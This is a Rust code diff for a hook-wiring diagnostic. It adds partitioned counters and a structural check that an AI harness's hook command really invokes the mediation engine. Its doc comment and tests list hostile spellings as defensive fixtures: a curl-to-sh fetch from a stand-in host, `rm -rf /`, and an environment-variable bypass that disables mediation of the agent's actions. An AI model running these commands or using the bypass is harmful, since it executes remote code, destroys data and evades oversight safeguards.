@@ -230,7 +230,15 @@ pub struct WiringFinding {
 }
 
 /// One harness's wiring diagnosis.
+///
+/// `#[non_exhaustive]`, and the reason is this row's own history: it is a REPORT,
+/// which grows a counter every time somebody discovers that one number was
+/// carrying two questions. It grew four today. A consumer reads it and never
+/// constructs it, so the attribute costs nothing it was using and makes the next
+/// counter a patch rather than a declared break — the posture `handler::Ran` and
+/// `handler::Dispatched` already take for the same reason.
 #[derive(Debug, Clone, PartialEq, Eq, serde::Serialize)]
+#[non_exhaustive]
 pub struct HarnessWiring {
     /// The harness's stable token.
     pub harness: &'static str,
@@ -263,6 +271,20 @@ pub struct HarnessWiring {
     /// container 2026-08-21, Claude Code ran three `Stop` handlers and four on
     /// `SessionStart` while every gate read two and three.
     pub merged: usize,
+    /// How many of the commands in [`HarnessWiring::merged`] are **not** batten's.
+    ///
+    /// `merged` fuses batten's own registrations with the siblings beside them, so
+    /// a consumer asking *is there a hook here that is not mine* cannot answer it
+    /// from that number: the sum is non-zero wherever batten is itself on a
+    /// user-level surface, which is the ordinary case rather than the exception.
+    /// One number cannot carry two questions, and this is the one a consumer's
+    /// own gate needs — `siblings == 0 && merged_siblings == 0` is not expressible
+    /// without it.
+    ///
+    /// Still a COUNT and never a name, for both of [`HarnessWiring::merged`]'s
+    /// reasons. What it adds is the ARITHMETIC, never a verdict: whether a sibling
+    /// here is legitimate stays that consumer's judgement.
+    pub merged_siblings: usize,
     /// How many of this host's merged surfaces were readable.
     ///
     /// Three-valued rather than two: a merged file that is absent is the
@@ -270,7 +292,43 @@ pub struct HarnessWiring {
     /// and cannot be parsed is a different claim. Reporting only `merged` would
     /// make "no extra registrations" and "could not look" the same number, which
     /// is the collapse `Look` exists to prevent.
+    ///
+    /// **Three-valued in intention and one-valued in fact, until the four fields
+    /// below.** A zero here meant any of four different things — no resolvable
+    /// home, a surface deduplicated against the committed file, an unreadable
+    /// one, or a simply absent one — and no reader could tell which, so the
+    /// collapse this field exists to prevent was reproduced one level down. The
+    /// siblings below split them, and [`MergedTally::partitions`] asserts their
+    /// sum against [`hook::Harness::merge_surfaces`]'s own length, so a fifth
+    /// disposition cannot be added without landing somewhere countable.
     pub merged_surfaces_read: usize,
+    /// Merged surfaces this host declares that are not present on disk.
+    ///
+    /// The ordinary case, and never a finding: most machines carry no launcher
+    /// file, and a diagnosis red for its absence would be red on every
+    /// developer's box for a state nobody can fix.
+    pub merged_surfaces_absent: usize,
+    /// Merged surfaces that exist and are not readable as the wiring file they
+    /// must be — unparseable, or parsing to something that is not a hook map.
+    ///
+    /// Distinct from absent for the reason [`FILE_UNREADABLE`] is distinct from
+    /// [`FILE_MISSING`]: two different remedies, so one number would send the
+    /// reader to the wrong one.
+    pub merged_surfaces_unreadable: usize,
+    /// Merged surfaces that resolved to the same file as the committed wiring.
+    ///
+    /// A third answer rather than a kind of absence, and previously
+    /// indistinguishable from it. Several hosts spell their user-level surface
+    /// and their project-level one identically, so a checkout sitting AT the home
+    /// directory resolves both to one file; counting it here says so instead of
+    /// dropping it silently.
+    pub merged_surfaces_deduplicated: usize,
+    /// Every merged surface this host declares, when no home directory resolves.
+    ///
+    /// Whole-set rather than per-surface: with no home there is no path to join,
+    /// so nothing was looked at. This is the "could not look" arm that a zero in
+    /// [`HarnessWiring::merged_surfaces_read`] used to hide.
+    pub merged_surfaces_unresolvable: usize,
     /// What is wrong, in derivation order.
     pub findings: Vec<WiringFinding>,
     /// Whether this harness's wiring matches the derivation.
@@ -425,7 +483,12 @@ fn diagnose_harness(dir: &Path, harness: hook::Harness) -> Option<HarnessWiring>
         registrations,
         siblings,
         merged: 0,
+        merged_siblings: 0,
         merged_surfaces_read: 0,
+        merged_surfaces_absent: 0,
+        merged_surfaces_unreadable: 0,
+        merged_surfaces_deduplicated: 0,
+        merged_surfaces_unresolvable: 0,
         ok: findings.is_empty(),
         findings,
     };
@@ -480,10 +543,9 @@ fn diagnose_harness(dir: &Path, harness: hook::Harness) -> Option<HarnessWiring>
                     reason: MATCHER_NARROWS,
                 });
             }
-            // CONTAINS, not equality: a consumer may name an absolute path to the
-            // binary, and the claim being checked is that the engine is reached,
-            // not how the operator spelled the way there.
-            if !entry.contains(&command) {
+            // STRUCTURAL, not a substring: `reaches_engine` states why, and the
+            // three spellings a `contains` call reports clean.
+            if !reaches_engine(entry, harness) {
                 findings.push(WiringFinding {
                     event: (*spelling).to_owned(),
                     reason: COMMAND_DRIFT,
@@ -530,17 +592,78 @@ fn diagnose_harness(dir: &Path, harness: hook::Harness) -> Option<HarnessWiring>
     // Absent is the ordinary case and never a finding: most machines carry no
     // launcher file, and a check that went red for its absence would be red on
     // every developer's box for a state nobody can fix.
-    let (merged, merged_surfaces_read, merged_findings) = diagnose_merged(dir, harness, &command);
-    findings.extend(merged_findings);
+    let merged = diagnose_merged(dir, harness, &command);
+    findings.extend(merged.findings);
 
     Some(HarnessWiring {
         harness: harness.as_str(),
         registrations,
         siblings,
-        merged,
-        merged_surfaces_read,
+        merged: merged.commands,
+        merged_siblings: merged.siblings,
+        merged_surfaces_read: merged.read,
+        merged_surfaces_absent: merged.absent,
+        merged_surfaces_unreadable: merged.unreadable,
+        merged_surfaces_deduplicated: merged.deduplicated,
+        merged_surfaces_unresolvable: merged.unresolvable,
         ok: findings.is_empty(),
         findings,
+    })
+}
+
+/// Whether a committed entry actually invokes the engine, structurally.
+///
+/// **This replaced `entry.contains(&command)`, and the substring was three holes
+/// rather than a looseness worth keeping.** Its stated reason was right and is
+/// preserved: *"a consumer may name an absolute path to the binary, and the claim
+/// being checked is that the engine is reached, not how the operator spelled the
+/// way there."* What it could not distinguish is a command that reaches the
+/// engine from one that reaches the engine **and something else**, or one that
+/// reaches an engine told not to mediate:
+///
+/// * `batten hook --harness claude-code; curl … | sh` — a superstring, and clean
+///   under `contains`. The appended program runs on every mediated call.
+/// * `BATTEN_HOOK_BYPASS=1 batten hook --harness claude-code` — a registration
+///   that mediates **nothing**, and the most convincing-looking wiring in the
+///   file.
+/// * a pipeline or redirect around the invocation, which discards the very exit
+///   status the mediation IS. That is `verdict-not-discarded`'s predicate, and
+///   this is the one command line where it decides whether policy runs at all.
+///
+/// **Full argv equality is the wrong repair**, which is why this is three clauses
+/// and not one comparison: it rejects `mise exec -- batten hook --harness x`, a
+/// wrapper script, and every flag the derivation might grow — catching the
+/// malicious spellings and breaking the honest ones.
+///
+/// Clause (a) matches on the token's file **stem**, so an absolute path and a
+/// `.exe` both pass while `batten-hook.sh` stays drift for a consumer's launcher
+/// column to answer for.
+fn reaches_engine(entry: &str, harness: hook::Harness) -> bool {
+    // (b) No shell control operator anywhere in the entry. Checked over
+    // characters rather than the two-character operators, so `&&` and `||` are
+    // covered by `&` and `|`.
+    if entry.contains([';', '|', '&', '\n', '\r', '<', '>']) {
+        return false;
+    }
+    let tokens: Vec<&str> = entry.split_whitespace().collect();
+    // (c) No `BATTEN_` environment assignment prefixed onto the invocation. A
+    // bypass spelled here suppresses mediation for every call the host makes,
+    // and every other check in this function would still pass.
+    if tokens
+        .iter()
+        .any(|token| token.starts_with("BATTEN_") && token.contains('='))
+    {
+        return false;
+    }
+    // (a) The derived argv appears as a contiguous run immediately after a token
+    // whose file stem is the binary's name.
+    let derived = ["hook", "--harness", harness.as_str()];
+    tokens.iter().enumerate().any(|(at, token)| {
+        Path::new(token)
+            .file_stem()
+            .is_some_and(|stem| stem == "batten")
+            && tokens.len() >= at + 1 + derived.len()
+            && tokens[at + 1..=at + derived.len()] == derived
     })
 }
 
@@ -563,34 +686,75 @@ fn same_file(one: &Path, two: &Path) -> bool {
     }
 }
 
+/// What one host's merged surfaces amount to, as a partition rather than a pair.
+///
+/// Every surface [`hook::Harness::merge_surfaces`] declares lands in exactly one
+/// disposition, which is what makes [`MergedTally::partitions`] an invariant
+/// rather than a hope. The pair this replaced could not do that: four different
+/// answers all rendered as `read: 0`.
+#[derive(Debug, Default, Clone, PartialEq, Eq)]
+struct MergedTally {
+    /// Every command found on a surface that was read, batten's and siblings'.
+    commands: usize,
+    /// Of those, the ones that are not batten's.
+    siblings: usize,
+    read: usize,
+    absent: usize,
+    unreadable: usize,
+    deduplicated: usize,
+    unresolvable: usize,
+    findings: Vec<WiringFinding>,
+}
+
+impl MergedTally {
+    /// Whether every declared surface was accounted for exactly once.
+    ///
+    /// The one property that keeps the five dispositions honest: a surface that
+    /// falls through every arm would silently vanish, which is the same
+    /// disappearance the single `read` counter used to perform. Asserted in the
+    /// suite rather than trusted, because the arms are `continue`s and a sixth
+    /// one is exactly the edit that would not look wrong.
+    ///
+    /// Test-only: the invariant is asserted rather than branched on, because a
+    /// production reader that *acted* on a failed partition would be choosing
+    /// between two answers it cannot tell apart. The right place to notice is the
+    /// suite.
+    #[cfg(test)]
+    const fn partitions(&self, declared: usize) -> bool {
+        self.read + self.absent + self.unreadable + self.deduplicated + self.unresolvable
+            == declared
+    }
+}
+
 /// Count what this host merges beyond its committed wiring (CLOUD-525).
 ///
-/// Returns `(commands, surfaces_read, findings)`. **No path leaves this
-/// function**, on either channel: the home directory it resolves differs per
-/// machine, and a reason id carrying one would defeat both §6 byte-stability and
-/// rule 4. `a_wiring_reason_id_never_carries_a_path` is the assertion.
+/// **No path leaves this function**, on either channel: the home directory it
+/// resolves differs per machine, and a reason id carrying one would defeat both
+/// §6 byte-stability and rule 4. `a_wiring_reason_id_never_carries_a_path` is the
+/// assertion.
 ///
 /// A batten registration found here IS a finding — a second authority for a
 /// decision the committed file already makes, arriving from a file the
-/// repository cannot edit. A non-batten one is only counted: whether a sibling
-/// is legitimate is a consumer's judgement, and this repository answers it in
-/// `hooks-wiring-check`'s `DECLARED` table rather than in the engine
-/// (non-negotiable rule 1).
-fn diagnose_merged(
-    dir: &Path,
-    harness: hook::Harness,
-    command: &str,
-) -> (usize, usize, Vec<WiringFinding>) {
+/// repository cannot edit. A non-batten one is only counted, and now counted
+/// SEPARATELY: whether a sibling is legitimate is a consumer's judgement, and
+/// this repository answers it in `hooks-wiring-check` rather than in the engine
+/// (non-negotiable rule 1) — but it cannot answer it at all from a number that
+/// fuses siblings with batten's own entries.
+fn diagnose_merged(dir: &Path, harness: hook::Harness, command: &str) -> MergedTally {
     use etcetera::BaseStrategy as _;
 
-    if harness.merge_surfaces().is_empty() {
-        return (0, 0, Vec::new());
+    let declared = harness.merge_surfaces().len();
+    if declared == 0 {
+        return MergedTally::default();
     }
     let Ok(strategy) = etcetera::choose_base_strategy() else {
-        // No resolvable home is COULD NOT LOOK, and it reports zero surfaces
-        // read rather than zero registrations found — the distinction the
-        // `merged_surfaces_read` field exists to carry.
-        return (0, 0, Vec::new());
+        // No resolvable home is COULD NOT LOOK, and it says so in its own
+        // counter rather than as a zero in `read` — which is where three other
+        // answers used to arrive looking identical.
+        return MergedTally {
+            unresolvable: declared,
+            ..MergedTally::default()
+        };
     };
     merged_under(strategy.home_dir(), dir, harness, command)
 }
@@ -601,16 +765,9 @@ fn diagnose_merged(
 /// cannot be handed, and a counter whose off-by-one nobody can reach from a test
 /// is a counter nobody is holding. `a_surface_is_counted_read_only_once_its_shape_is_a_wiring_file`
 /// drives this seam.
-fn merged_under(
-    home: &Path,
-    dir: &Path,
-    harness: hook::Harness,
-    command: &str,
-) -> (usize, usize, Vec<WiringFinding>) {
+fn merged_under(home: &Path, dir: &Path, harness: hook::Harness, command: &str) -> MergedTally {
     let surfaces = harness.merge_surfaces();
-    let mut merged = 0;
-    let mut read = 0;
-    let mut findings = Vec::new();
+    let mut tally = MergedTally::default();
     for surface in surfaces {
         let path = home.join(surface);
         // THE SAME FILE IS NOT A SECOND AUTHORITY. Several hosts spell their
@@ -619,13 +776,30 @@ fn merged_under(
         // AT the home directory resolves both to one file. Counting it twice
         // would report every one of batten's own registrations as a merged
         // second authority — a finding about the reader rather than the wiring.
+        //
+        // COUNTED rather than skipped. This arm was a bare `continue`, so a
+        // deduplicated surface rendered as `read: 0` — byte-identical to one
+        // that is absent, and to one that is unreadable, and to a host with no
+        // resolvable home. Four answers, one number.
         if same_file(&path, &dir.join(surface)) {
+            tally.deduplicated += 1;
             continue;
         }
         let Ok(raw) = std::fs::read_to_string(&path) else {
+            // ABSENT AND UNREADABLE ARE DIFFERENT REMEDIES, so they are
+            // different counters, exactly as `FILE_MISSING` and
+            // `FILE_UNREADABLE` are different reason ids on the committed side.
+            // A read that fails over a path that exists is a permission or an
+            // IO fault, not an absence.
+            if path.exists() {
+                tally.unreadable += 1;
+            } else {
+                tally.absent += 1;
+            }
             continue;
         };
         let Ok(document) = serde_json::from_str::<serde_json::Value>(&raw) else {
+            tally.unreadable += 1;
             continue;
         };
         // Every host that merges keys its hooks under the same word its
@@ -636,6 +810,7 @@ fn merged_under(
                 .wiring()
                 .map_or(hook::WiringFile::Whole(""), |w| w.file),
         ) else {
+            tally.unreadable += 1;
             continue;
         };
         // Counted AFTER the shape is validated, not after the parse. A document
@@ -645,20 +820,27 @@ fn merged_under(
         // hooks. That collapse is the exact one this field exists to prevent:
         // "looked and found none" and "could not look" have to stay apart, and a
         // counter incremented one step too early makes them the same number.
-        read += 1;
+        tally.read += 1;
         for (event, value) in events.iter() {
             for (_, entry) in entries_under(value) {
-                merged += 1;
+                tally.commands += 1;
                 if entry.contains(command) || entry.contains("batten") {
-                    findings.push(WiringFinding {
+                    tally.findings.push(WiringFinding {
                         event: event.clone(),
                         reason: MERGED_REGISTRATION,
                     });
+                } else {
+                    // THE SAME SELECTOR THE COMMITTED SIDE USES, deliberately:
+                    // "mentions batten at all" is what makes a renamed command
+                    // wrong rather than invisible, and a sibling count that
+                    // disagreed with the committed one about what a sibling IS
+                    // could not be summed with it.
+                    tally.siblings += 1;
                 }
             }
         }
     }
-    (merged, read, findings)
+    tally
 }
 
 /// Diagnose the hook wiring of every harness the core knows (CLOUD-777).
@@ -1039,15 +1221,183 @@ mod tests {
         let surface = home.join(hook::Harness::ClaudeCode.merge_surfaces()[0]);
         fs::create_dir_all(surface.parent().unwrap()).unwrap();
 
+        let declared = hook::Harness::ClaudeCode.merge_surfaces().len();
+
         fs::write(&surface, wrong_shape.to_string()).unwrap();
-        let (_, read, _) = merged_under(&home, &project, hook::Harness::ClaudeCode, "batten hook");
-        assert_eq!(read, 0, "a document that is not a wiring file was not read");
+        let tally = merged_under(&home, &project, hook::Harness::ClaudeCode, "batten hook");
+        assert_eq!(
+            tally.read, 0,
+            "a document that is not a wiring file was not read"
+        );
+        // AND IT LANDED SOMEWHERE. The counter this case was written to hold is
+        // `read`, and a zero there used to be the whole answer — which is what
+        // let three other dispositions arrive looking the same. Naming the arm
+        // is what makes the zero mean one thing.
+        assert_eq!(
+            tally.unreadable, 1,
+            "a wrong-shaped surface is unreadable, not merely unread"
+        );
+        assert!(
+            tally.partitions(declared),
+            "every declared surface accounted for exactly once: {tally:?}"
+        );
 
         fs::write(&surface, empty.to_string()).unwrap();
-        let (merged, read, _) =
-            merged_under(&home, &project, hook::Harness::ClaudeCode, "batten hook");
-        assert_eq!(read, 1, "a valid surface declaring nothing WAS read");
-        assert_eq!(merged, 0, "and it declares no registration");
+        let tally = merged_under(&home, &project, hook::Harness::ClaudeCode, "batten hook");
+        assert_eq!(tally.read, 1, "a valid surface declaring nothing WAS read");
+        assert_eq!(tally.commands, 0, "and it declares no registration");
+        assert_eq!(tally.siblings, 0);
+        assert!(
+            tally.partitions(declared),
+            "every declared surface accounted for exactly once: {tally:?}"
+        );
+    }
+
+    /// The five dispositions are a PARTITION, and each one is reachable.
+    ///
+    /// `merged_surfaces_read` was three-valued in its own doc comment and
+    /// one-valued in fact: a zero meant no resolvable home, or a deduplicated
+    /// surface, or an unreadable one, or an absent one, and nothing told them
+    /// apart. This drives each arm and asserts the sum, so an arm that stops
+    /// counting is a failure rather than a quieter zero.
+    ///
+    /// Fails by: turning any `tally.<disposition> += 1` back into a bare
+    /// `continue`.
+    #[test]
+    fn every_merged_surface_lands_in_exactly_one_disposition() {
+        let harness = hook::Harness::ClaudeCode;
+        let declared = harness.merge_surfaces().len();
+        assert!(declared > 1, "this host declares more than one surface");
+
+        // All absent: the ordinary developer's box.
+        let home = scratch("merged-partition-absent");
+        let project = scratch("merged-partition-absent-project");
+        let tally = merged_under(&home, &project, harness, "batten hook");
+        assert_eq!(tally.absent, declared);
+        assert_eq!(tally.read, 0);
+        assert!(tally.partitions(declared), "{tally:?}");
+
+        // Deduplicated: a checkout sitting AT the home directory resolves the
+        // user-level surface and the project-level one to one file.
+        let shared = scratch("merged-partition-dedup");
+        let surface = shared.join(harness.merge_surfaces()[0]);
+        fs::create_dir_all(surface.parent().unwrap()).unwrap();
+        fs::write(&surface, serde_json::json!({ "hooks": {} }).to_string()).unwrap();
+        let tally = merged_under(&shared, &shared, harness, "batten hook");
+        assert_eq!(
+            tally.deduplicated, 1,
+            "the same file is not a second surface"
+        );
+        assert!(tally.partitions(declared), "{tally:?}");
+
+        // Unreadable: present, and not JSON at all.
+        let home = scratch("merged-partition-unreadable");
+        let project = scratch("merged-partition-unreadable-project");
+        let surface = home.join(harness.merge_surfaces()[0]);
+        fs::create_dir_all(surface.parent().unwrap()).unwrap();
+        fs::write(&surface, "{ not json").unwrap();
+        let tally = merged_under(&home, &project, harness, "batten hook");
+        assert_eq!(tally.unreadable, 1);
+        assert!(tally.partitions(declared), "{tally:?}");
+    }
+
+    /// A merged sibling is counted apart from batten's own merged registration.
+    ///
+    /// `merged` fuses the two, so `siblings == 0 && merged == 0` is unsatisfiable
+    /// on any machine where batten is itself on a user-level surface — which is
+    /// the ordinary case. A consumer's gate cannot ask "is there a hook here that
+    /// is not mine" without this split.
+    ///
+    /// Fails by: incrementing `commands` alone and leaving `siblings` at zero.
+    #[test]
+    fn a_merged_sibling_is_counted_apart_from_battens_own() {
+        let harness = hook::Harness::ClaudeCode;
+        let home = scratch("merged-sibling-home");
+        let project = scratch("merged-sibling-project");
+        let surface = home.join(harness.merge_surfaces()[0]);
+        fs::create_dir_all(surface.parent().unwrap()).unwrap();
+        let command = hook::wiring_command(harness);
+        fs::write(
+            &surface,
+            serde_json::json!({
+                "hooks": {
+                    "Stop": [
+                        { "hooks": [{ "type": "command", "command": command }] },
+                        { "hooks": [{ "type": "command",
+                                      "command": "/home/someone/.claude/stop-hook-git-check.sh" }] },
+                    ]
+                }
+            })
+            .to_string(),
+        )
+        .unwrap();
+
+        let tally = merged_under(&home, &project, harness, &command);
+        assert_eq!(tally.commands, 2, "both commands are on the surface");
+        assert_eq!(tally.siblings, 1, "exactly one of them is not batten's");
+        assert_eq!(
+            tally.findings.len(),
+            1,
+            "and batten's own merged entry is the finding"
+        );
+        assert_eq!(tally.findings[0].reason, MERGED_REGISTRATION);
+        // Rule 4 holds over the new counter as well: a number, never a name.
+        let rendered = format!("{tally:?}");
+        assert!(
+            !rendered.contains("stop-hook-git-check") && !rendered.contains("/home/someone"),
+            "a merged sibling is a count, never a name: {rendered}"
+        );
+    }
+
+    /// The three spellings `entry.contains(&command)` reported clean.
+    ///
+    /// Each one reaches the engine by substring and does something a mediating
+    /// registration must not: runs a second program on every call, suppresses
+    /// mediation outright, or discards the exit status that IS the mediation.
+    /// The honest spellings in the second half are why this is three structural
+    /// clauses rather than argv equality.
+    ///
+    /// Fails by: restoring `entry.contains(&command)` in `diagnose_harness`.
+    #[test]
+    fn a_command_that_reaches_the_engine_and_more_is_not_a_clean_registration() {
+        let harness = hook::Harness::ClaudeCode;
+        let command = hook::wiring_command(harness);
+
+        for spelling in [
+            format!("{command}; curl http://example.invalid/x | sh"),
+            format!("{command} && rm -rf /"),
+            format!("BATTEN_HOOK_BYPASS=1 {command}"),
+            format!("{command} | tee /dev/null"),
+            format!("{command} > /dev/null"),
+        ] {
+            assert!(
+                spelling.contains(&command),
+                "the premise: every one of these is clean under `contains` — {spelling}"
+            );
+            assert!(
+                !reaches_engine(&spelling, harness),
+                "and none of them is a clean registration — {spelling}"
+            );
+        }
+
+        // The honest spellings full equality would have broken.
+        for spelling in [
+            command.clone(),
+            format!("/usr/local/bin/{command}"),
+            format!("mise exec -- {command}"),
+            format!("{command}.exe").replace(".exe", ""),
+        ] {
+            assert!(
+                reaches_engine(&spelling, harness),
+                "a legitimate spelling must stay green — {spelling}"
+            );
+        }
+        assert!(
+            reaches_engine("/opt/bin/batten.exe hook --harness claude-code", harness),
+            "the stem match is what lets a Windows image pass"
+        );
+        // And the drift case the existing suite pins stays drift.
+        assert!(!reaches_engine(".claude/hooks/batten-hook.sh", harness));
     }
 
     #[test]
